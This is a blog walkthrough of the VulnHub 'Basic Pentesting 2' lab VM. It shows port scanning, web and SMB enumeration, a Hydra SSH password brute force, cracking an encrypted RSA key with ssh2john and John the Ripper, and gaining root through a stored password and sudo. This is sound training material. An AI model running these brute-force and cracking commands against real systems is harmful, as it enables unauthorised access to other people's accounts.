---
title: Basic Pentesting 2 walkthrough
date: 00:00 20-07-2018
taxonomy:
    tag:
        - hacking
        - CTF
        - walkthrough
    category:
        - blog
---

## Intro

Basic Pentesting 2 is a vulnerable VM freely available on [VulnHub](https://www.vulnhub.com/entry/basic-pentesting-2,241/). 

The target of the exercise is to gain root access and read the flag located at /root/flag.txt.


## Setup

Download the VM from vulnhub.com and import it in your VirtualBox.

At this point you may want to edit the VM network settings, in order to connect the vulnerable VM to the Kali machine. In my case, my Kali installation resides in a separate virtual machine, which can join the same virtual network of the vulnerable one.

After launching the vulnerable VM, a login screen is shown on the virtual monitor.

I need to find the IP address of the vulnerable VM, and this is done with a quick nmap scan:

```
root@kali:~# nmap -sS 192.168.56.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-19 07:17 EDT
Nmap scan report for 192.168.56.1
Host is up (0.000045s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 0A:00:27:00:00:00 (Unknown)

Nmap scan report for 192.168.56.100
Host is up (0.000081s latency).
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:E9:F2:8A (Oracle VirtualBox virtual NIC)

Nmap scan report for 192.168.56.101
Host is up (0.00016s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy
MAC Address: 08:00:27:A1:01:12 (Oracle VirtualBox virtual NIC)


Nmap scan report for 192.168.56.102
Host is up (0.0000050s latency).
All 1000 scanned ports on 192.168.56.102 are closed

Nmap done: 256 IP addresses (4 hosts up) scanned in 5.88 seconds

```

In order not to have to enter the vulnerable machine's IP every time, I added the machine's IP to the Kali's **/etc/hosts** file, by appending the following line:


```
192.168.56.101	target.local
```

## Attack

The nmap scan already provided some useful information. 

### Port 22 ###
Let's try to connect to the SSH server.

```
root@kali:~# ssh root@target.local
root@target.local's password:
```
Cool, a password protected SSH access. Of course, though, we have no username nor password to enter at the moment, so it is useless for the moment.

### Port 80 ###

Open the browser and browse to http://target.local. A simple maintenance webpage is shown. The HTML source contains a small note talking about a dev note section. Let's try to find some additional information about this with **dirbuster**.

```
root@kali:~# dirb http://target.local
	-----------------
	DIRB v2.22    
	By The Dark Raver
	-----------------
	
	START_TIME: Thu Jul 19 07:19:40 2018
	URL_BASE: http://target.local/
	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
	
	-----------------
	
	GENERATED WORDS: 4612                                                          
	
	---- Scanning URL: http://target.local/ ----
	==> DIRECTORY: http://target.local/development/                                      	                                                                                     	                                        
	+ http://target.local/index.html (CODE:200|SIZE:158)                                 	                                                                                     	                                        
	+ http://target.local/server-status (CODE:403|SIZE:300)                              	                                                                                     	                                        
	                                                                                                                                                                                                                  
	---- Entering directory: http://target.local/development/ ----
	(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
	    (Use mode '-w' if you want to scan it anyway)
	                                                                               
	-----------------
	END_TIME: Thu Jul 19 07:19:43 2018
	DOWNLOADED: 4612 - FOUND: 2
```

Looks like the webserver is also hosting something in the /development/ folder! Browsing to http://target.local/development/ two files are found:

* dev.txt: containing some activity tracking between two developers, "**K**" and "**J**". J did set up Apache and Struts 2.5.12. K has set up SMB

* j.txt: a message from K to J, where he states that J is using a *weak password* and should change it ASAP

Very interesting! Looks like J's authentication is a weak point that could be exploited. Still, though, we are missing the usernames used by K and J on the vulnerable machine.

### Ports 139/445 ###
Ports 139 and 445 are used by NetBIOS and SMB. These ports are a huge source of information. The *enum4linux* tool can help in this case.

```
root@kali:~# enum4linux target.local
```

The [output](files/enum4linux_output.txt) of the command reveals the existence of two users on the target machine, one for "K" and one for "J":

```
....
....
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
....
```

The previous information regarding jan's weak password becomes now useful.

*Hydra* allows to bruteforce the ssh login with jan's user:

```
root@kali:~# hydra -l jan -P /usr/share/wordlists/rockyou.txt target.local ssh
	Hydra (http://www.thc.org/thc-hydra) starting at 2018-07-19 09:48:09
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is 	recommended to reduce the tasks: use -t 4
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (	l:1/p:14344399), ~896525 tries per task
	[DATA] attacking ssh://target.local:22/
	[STATUS] 262.00 tries/min, 262 tries in 00:01h, 14344143 to do in 912:29h, 16 active
	[STATUS] 248.33 tries/min, 745 tries in 00:03h, 14343663 to do in 962:40h, 16 active
	[22][ssh] host: target.local   login: jan   password: armando
```

Ok, jan's password was actually quite weak...

Let's try to log in with jan

```
root@kali:~# ssh jan@target.local
	jan@target.local's password:
	Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
	...
	...
	jan@basic2:~$
```

We are in!

Jan's home folder is empty, but he has read access to Kay's home folder, specifically to the .ssh folder where Kay stores his rsa keys (both private and public). The private key, however, is encrypted.

Copy the id_rsa file to the Kali machine and convert it to a hash, in order to use it with John the Ripper

```
root@kali:~# ssh2john id_rsa > hash
```

The next step consists in using John the Ripper to crack the password:

```
root@kali:~# john --wordlis=/usr/share/wordlists/rockyou.txt --format=SSH hash 
	Using default input encoding: UTF-8
	Loaded 1 password hash (SSH [RSA/DSA 32/64])
	Press 'q' or Ctrl-C to abort, almost any other key for status
	beeswax          (id_rsa)
	1g 0:00:00:00 DONE (2018-07-20 07:50) 1.408g/s 116511p/s 116511c/s 116511C/s beeswax
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed
```

The cracking succeeded: *beeswax* is the password to unlock Kay's RSA key.

```
root@kali:~# ssh -i id_rsa kay@target.local
	Enter passphrase for key 'id_rsa': 
	Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
	...
	...
	kay@basic2:~$
	kay@basic2:~$ groups kay
	kay : kay adm cdrom sudo dip plugdev lxd lpadmin sambashare
```

The login succeded! The next step is to find Kay's password, since he belongs to the sudo group.

Luckily, Kay saved his password in a backup file in his home directory, called *pass.bak*.

```
kay@basic2:~$ cat pass.bak
	heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Type **sudo su**, enter the latter password and...

```
root@basic2:/home/kay# whoami
root
```

Win!

The last step consists in reading the /root/flag.txt file. Looks like there are two possible ways to gain a shell, and two possible ways to privesc. I guess I will have to find the second path in a future exercise!